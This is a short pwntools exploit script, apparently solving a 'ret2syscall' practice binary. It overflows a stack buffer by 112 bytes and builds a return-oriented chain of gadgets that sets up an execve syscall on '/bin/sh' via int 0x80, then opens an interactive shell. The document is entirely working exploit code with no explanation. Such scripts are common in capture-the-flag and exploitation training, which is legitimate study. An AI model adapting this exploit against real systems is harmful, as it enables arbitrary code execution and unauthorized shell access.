from pwn import*

offset = 112

pop_eax_addr = 0x080bb196
pop_edx_ecx_ebx_addr = 0x0806eb90
bin_sh_addr = 0x080be408
int_0x80_addr = 0x08049421

proc = process("./pwn/ret2syscall/ret2syscall")

proc.sendline(b'A' * offset \
        + p32(pop_eax_addr) + p32(0x0b) \
        + p32(pop_edx_ecx_ebx_addr) + p32(0x00) + p32(0x00) + p32(bin_sh_addr) \
        + p32(int_0x80_addr))

proc.interactive()
